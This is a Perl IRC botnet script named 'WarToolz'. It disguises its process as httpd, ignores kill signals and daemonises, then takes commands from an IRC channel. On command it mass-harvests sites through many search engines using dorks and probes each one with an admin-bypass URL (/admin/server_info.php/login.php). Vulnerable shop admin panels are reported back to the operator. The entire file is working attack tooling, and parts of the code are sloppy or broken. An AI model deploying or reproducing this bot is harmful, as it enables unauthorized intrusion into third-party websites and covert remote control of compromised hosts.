#!/usr/bin/perl
##############Based on VOP Crew 5.1 #yoga0400

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use Socket;

my $fakeproc  = '/usr/sbin/httpd';
$ircserver    = $ARGV[0] unless $ircserver;
my $ircport   = '6667';
my $nickname  = 'B0x3D|'.int(rand(20)).'|';
my $ident     = 'WarToolz';
my $channel   = '#opers';
my $fullname  = '4WarToolz.com Service';

my $alfi    = '!zen'.int(rand(20));
my $osc    = '!osc'.int(rand(20));
my $osclocal = '!oscl'.int(rand(20));
my $zenlocal = '!zenl'.int(rand(20));

$status      = 0;
$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';

chdir("/");
$ircserver="$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0"x16;;
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();

sub sendraw {
	if ($#_ == '1') {
	my $socket = $_[0];
	print $socket "$_[1]\n";
	} else {
		print $IRC_cur_socket "$_[0]\n";
	}
}

sub connector {
	my $mynick = $_[0];
	my $ircserver_con = $_[1];
	my $ircport_con = $_[2];
	my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
	if (defined($IRC_socket)) {
		$IRC_cur_socket = $IRC_socket;
		$IRC_socket->autoflush(1);
		$sel_client->add($IRC_socket);
		$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
		$irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		$irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
		nick("$mynick");
		sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
		sleep 1;
	}
}

sub parse {
	my $servarg = shift;
	if ($servarg =~ /^PING \:(.*)/) {
		sendraw("PONG :$1");
	} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
		my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
		if ($args =~ /^\001VERSION\001$/) {
			notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
		}
		if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
			my $natrix = $1;
			my $arg = $2;
		}
	}
	elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
		if (lc($1) eq lc($mynick)) {
			$mynick=$4;
			$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		}
	} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
		nick("$mynick|".int rand(999));
	} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
		$mynick = $2;
		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
		sendraw("MODE $nickname +Bx");
		sendraw("JOIN $channel");
		sendraw("PRIVMSG $channel :WarToolz Test Service");
	}
}

my $line_temp;
while( 1 ) {
	while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
	delete($irc_servers{''}) if (defined($irc_servers{''}));
	my @ready = $sel_client->can_read(0);
	next unless(@ready);
	foreach $fh (@ready) {
		$IRC_cur_socket = $fh;
		$mynick = $irc_servers{$IRC_cur_socket}{'nick'};
		$nread = sysread($fh, $msg, 4096);
		if ($nread == 0) {
			$sel_client->remove($fh);
			$fh->close;
			delete($irc_servers{$fh});
		}
		@lines = split (/\n/, $msg);
		$msg =~ s/\r\n$//;

		#####################################################################
		############################[ CMD LIST ]#############################
		#####################################################################

		if ($msg=~ /PRIVMSG $channel :!id/){
			&response();
		}
		if ($msg=~ /PRIVMSG $channel :!cmd/){
		sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4CMD3]12 $osc | $alfi | $osclocal | $zenlocal");
		}

		#####################################################################
		###############################[ OSC-AUTO ]##########################
		#####################################################################
				##################################################################### LOCAL Google Engine
		if ($msg=~ /PRIVMSG $channel :$osclocal\s+(.*)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "localgoogle";
					my $d0rk = $1; my $admin = $2;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][4WarToolz3]12 Dork :4 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][4WarToolz3]7 Search Engine Loading ...");
					&osclocal($engx,$d0rk,$admin);
				}
				exit;
			}
		}
						##################################################################### LOCAL Bing Engine
		if ($msg=~ /PRIVMSG $channel :$osclocal\s+(.*)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "localbing";
					my $d0rk = $1; my $admin = $2;
					&osclocal($engx,$d0rk,$admin);
				}
				exit;
			}
		}
		
		##################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1; 
					sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][4WarToolz3]12 Dork :4 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][4WarToolz3]7 Search Engine Loading ...");
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1;
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Bing Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Bing";
					my $d0rk = $1; 
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Altavista Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $d0rk = $1;
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ASK Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AsK";
					my $d0rk = $1; 
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### UoL Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "UoL";
					my $d0rk = $1; 
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### LyCos Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "LyCos";
					my $d0rk = $1;
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### GoodSearch Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GoodSearch";
					my $d0rk = $1;
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Yahoo Engine
		if ($msg=~ /PRIVMSG $channel :$osc\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "YahOo";
					my $d0rk = $1;
					&oscscan($engx,$d0rk);
				}
				exit;
			}
		}

		#####################################################################
		###############################[ LFI-AUTO ]##########################
		#####################################################################
						##################################################################### LOCAL Google Engine
		if ($msg=~ /PRIVMSG $channel :$zenlocal\s+(.*)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "localgoogle";
					my $d0rk = $1; my $admin = $2;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][4WarToolz3]12 Dork :4 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][4WarToolz3]7 Search Engine Loading ...");
					&zenlocal($engx,$d0rk,$admin);
				}
				exit;
			}
		}
						##################################################################### LOCAL Bing Engine
		if ($msg=~ /PRIVMSG $channel :zenlocal\s+(.*)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "localbing";
					my $d0rk = $1; my $admin = $2;
					&zenlocal($engx,$d0rk,$admin);
				}
				exit;
			}
		}

		##################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3][4WarToolz3]12 Dork :4 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3][4WarToolz3]7 Search Engine Loading ...");
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1; 
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Bing Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Bing";
					my $d0rk = $1; 
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Altavista Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $d0rk = $1;
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ASK Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AsK";
					my $d0rk = $1;
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### UoL Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "UoL";
					my $d0rk = $1; 
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### LyCos Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "LyCos";
					my $d0rk = $1; 
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### GoodSearch Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GoodSearch";
					my $d0rk = $1; 
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Yahoo Engine
		if ($msg=~ /PRIVMSG $channel :$alfi\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "YahOo";
					my $d0rk = $1; 
					&aliscan($engx,$d0rk);
				}
				exit;
			}
		}





		for(my $c=0; $c<= $#lines; $c++) {
			$line = $lines[$c];
			$line=$line_temp.$line if ($line_temp);
			$line_temp='';
			$line =~ s/\r$//;
			unless ($c == $#lines) {
				parse("$line");
			} else {
				if ($#lines == 0) {
					parse("$line");
				} elsif ($lines[$c] =~ /\r$/) {
					parse("$line");
				} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
					parse("$line");
				} else {
					$line_temp = $line;
				}
			}
		}
	}
}

##################################################################### Procedure
sub osclocal() {

	my $engz = $_[0];
	my $dork = $_[1];
	my $admin = $_[2];
	my $contatore = 0;
	if ($engz =~ /localgoogle/) {
		my @localgoogle=&localgoogle($dork,$admin);
		push(@total, @localgoogle);
		}
	if ($engz =~ /localbing/) {
		my @localbing=&localbing($dork,$admin);
		push(@total, @localbing);
		}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][2$engz3]12 Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).")");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][2$engz3]7 Exploiting4 $dork");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean){
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][2$engz3]10 Scan Finish for14 $dork");
		}

			my $xpl= "http://".$target."/admin/server_info.php/login.php";
			my $re  = getcontent($xpl);
			if($re =~ /<tr><td class=\"e\">System <\/td><td class=\"v\">(.*)<\/td><\/tr>/){
			my $server= $1;
				my $xpl2 = "http://".$target."/admin/" ;
							sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3]73".$xpl2." 6(4".$server."6)");
							}

		}






}

sub zenlocal() {

	my $engz = $_[0];
	my $dork = $_[1];
	my $admin = $_[2];
	my $contatore = 0;
	if ($engz =~ /localgoogle/) {
		my @localgoogle=&localgoogle($dork,$admin);
		push(@total, @localgoogle);
		}
	if ($engz =~ /localbing/) {
		my @localbing=&localbing($dork,$admin);
		push(@total, @localbing);
		}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3][2$engz3]12 Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).")");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3][2$engz3]7 Exploiting4 $dork");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean){
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3][2$engz3]10 Scan Finish for14 $dork");
		}

			my $xpl= "http://".$target."/admin/server_info.php/password_forgotten.php";
			my $re  = getcontent($xpl);
			if($re =~ /<tr><td class=\"e\">System <\/td><td class=\"v\">(.*)<\/td><\/tr>/){
			my $server= $1;
				my $xpl2 = "http://".$target."/admin/" ;
							sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3]73".$xpl2." 6(4".$server."6)");
							}

		}






}

sub oscscan() {

	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /Bing/) {
		my @Bing=&Bing($dork);
		push(@total, @Bing);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /AsK/) {
		my @ask=&ask($dork);
		push(@total, @ask);
	}
	if ($engz =~ /UoL/) {
		my @uol=&uol($dork);
		push(@total, @uol);
	}
	if ($engz =~ /LyCos/) {
		my @lycos=&lycos($dork);
		push(@total, @lycos);
	}
	if ($engz =~ /GoodSearch/) {
		my @goodsearch=&goodsearch($dork);
		push(@total, @goodsearch);
	}
	if ($engz =~ /YahOo/) {
		my @yahoo=&yahoo($dork);
		push(@total, @yahoo);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][2$engz3]12 Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).")");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][2$engz3]7 Exploiting4 $dork");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean){
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3][2$engz3]10 Scan Finish for14 $dork");
		}

			my $xpl= "http://".$target."/admin/server_info.php/login.php";
			my $re  = getcontent($xpl);
			if($re =~ /<tr><td class=\"e\">System <\/td><td class=\"v\">(.*)<\/td><\/tr>/){
			my $server= $1;
				my $xpl2 = "http://".$target."/admin/" ;
							sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4OSC3]73".$xpl2." 6(4".$server."6)");
							}

		}






}

sub aliscan() {

	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /Bing/) {
		my @Bing=&Bing($dork);
		push(@total, @Bing);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /AsK/) {
		my @ask=&ask($dork);
		push(@total, @ask);
	}
	if ($engz =~ /UoL/) {
		my @uol=&uol($dork);
		push(@total, @uol);
	}
	if ($engz =~ /LyCos/) {
		my @lycos=&lycos($dork);
		push(@total, @lycos);
	}
	if ($engz =~ /GoodSearch/) {
		my @goodsearch=&goodsearch($dork);
		push(@total, @goodsearch);
	}
	if ($engz =~ /YahOo/) {
		my @yahoo=&yahoo($dork);
		push(@total, @yahoo);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3][2$engz3]12 Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).")");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3][2$engz3]7 Exploiting4 $dork");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean){
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3][2$engz3]10 Scan Finish for14 $dork");
		}

			my $xpl= "http://".$target."/admin/server_info.php/password_forgotten.php";
			my $re  = getcontent($xpl);
			if($re =~ /<tr><td class=\"e\">System <\/td><td class=\"v\">(.*)<\/td><\/tr>/){
				my $xpl2 = "http://".$target."/admin/" ;
				my $server= $1;
							sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4ZSC3]73".$xpl2." 6(4".$server."6)");
							}

		}






}


sub os() {
	my $site = $_[0];
	my $re   = &query($site);
	while ($re =~ m/<br>os:(.+?)<br>/g) {
		$os = $1;
		if ($1 =~ //) { $os = "Unkn0wN"; }
	}
}

sub response() {
    my $re = getcontent($injector);
    if ($re =~ /pZLNd8MwEITvg/) {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4RFI3]12 « 3OK12 »");
    }
    else {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :3[4RFI3]12 « 4JAH12 »");
    }
}

sub getcontent() {
    $url    = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(5);
    my $response = $ua->request($req);
    return $response->content;
}

sub envgetcontent() {
    $url    = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
	$ua -> agent("WarToolz");
    $ua->timeout(5);
    my $response = $ua->request($req);
    return $response->content;
}


sub google(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=0; $b<=1000; $b+=100){
        my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
        my $Res=query($Go);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
            if ($1 !~ /google/){
                my $k=$1;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub localgoogle(){
    my @lst;
    my $key = $_[0];
	my $admin = $_[1];
    my $b   = 0;
    for ($b=0; $b<=1000; $b+=100){
        my $Go=("http://www.google.com/search?q=".key($key)."&hl=en&num=100&lr=&ft=i&cr=country".$admin."&filter=0&start=".$b);
        my $Res=query($Go);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
            if ($1 !~ /google/){
                my $k=$1;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub localbing(){
    my @lst;
    my $key = $_[0];
	my $admin = $_[1];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $bing = ("http://www.bing.com/search?q=".key($key)."+loc:".$admin."&filt=all&first=".$b."&FORM=PERE");
        my $Res = query($bing);
        while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live|bing/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=1000; $b+=100) {
        my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$b);
        my $Res = query($all);
        while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub uol() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $UoL = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$b);
        my $Res = query($UoL);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
            my $k = $1;
            if ( $k !~ /busca|uol|yahoo/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub Bing() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $bing = ("http://www.bing.com/search?q=".key($key)."&filt=all&first=".$b."&FORM=PERE");
        my $Res = query($bing);
        while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live|bing/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}


sub altavista(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10){
        my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
        my $Res=query($AlT);
        while ($Res=~m/<span class=ngrn>(.+?)\//g){
            if ($1 !~ /altavista/){
                my $k=$1;
                $k=~s/<//g;
                $k=~s/ //g;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub ask() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=1000; $b+=10) {
        my $Ask = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$b);
        my $Res = query($Ask);
        while ($Res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
            if ($1 !~ /ask.com/){
				my $k = $1;
				my @grep = links($k);
				push( @lst, @grep );
			}
        }
    }
    return @lst;
}

sub lycos() {
	my @lst;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=1000; $b+=10) {
        my $lyc = ("http://cerca.lycos.it/cgi-bin/pursuit?pag=".$b."&query=".key($key)."&cat=web&enc=utf-8");
        my $Res = query($lyc);
        while ($Res =~ m/href=\"http:\/\/(.+?)\"  >/g) {
            if ($1 !~ /lycos/){
                my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub goodsearch() {
	my @lst;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $goods = ("http://www.goodsearch.com/search.aspx?keywords=".key($key)."&page=".$b."&osmax=0");
        my $Res = query($goods);
        while ($Res =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g) {
            if ($2 !~ /goodsearch/){
                my $k = $2;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub yahoo() {
	my @lst;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $yahoo = ("http://www.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
        my $Res = query($yahoo);
        while ($Res =~ m/26u=(.*?)%26w=/g) {
            if ($1 !~ /yahoo/){
                my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub links() {
	my @l;
	my $link = $_[0];
	my $host = $_[0];
	my $hdir = $_[0];
	$hdir =~ s/(.*)\/[^\/]*$/\1/;
	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$host .= "/";
	$link .= "/";
	$hdir .= "/";
	$host =~ s/\/\//\//g;
	$hdir =~ s/\/\//\//g;
	$link =~ s/\/\//\//g;
	push( @l, $link, $host, $hdir );
	return @l;
}

sub key() {
	my $dork = $_[0];
	$dork =~ s/ /\+/g;
	$dork =~ s/:/\%3A/g;
	$dork =~ s/\//\%2F/g;
	$dork =~ s/&/\%26/g;
	$dork =~ s/\"/\%22/g;
	$dork =~ s/,/\%2C/g;
	$dork =~ s/\\/\%5C/g;
	return $dork;
}

sub query($) {
	my $url = $_[0];
	$url =~ s/http:\/\///;
	my $host  = $url;
	my $query = $url;
	my $page  = "";
	$host  =~ s/href=\"?http:\/\///;
	$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$query =~ s/$host//;
	if ( $query eq "" ) { $query = "/"; }
		eval {
			my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
			print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
			my @r = <$sock>;
			$page = "@r";
			close($sock);
		};
	return $page;
}

sub calculate {
	my @calculate = ();
	my %visti = ();
	foreach my $element (@_) {
		$element =~ s/\/+/\//g;
		next if $visti{$element}++;
		push @calculate, $element;
	}
	return @calculate;
}

sub nick {
	return unless $#_ == 0;
	sendraw("NICK $_[0]");
}

sub notice {
	return unless $#_ == 1;
	sendraw("NOTICE $_[0] :$_[1]");
}
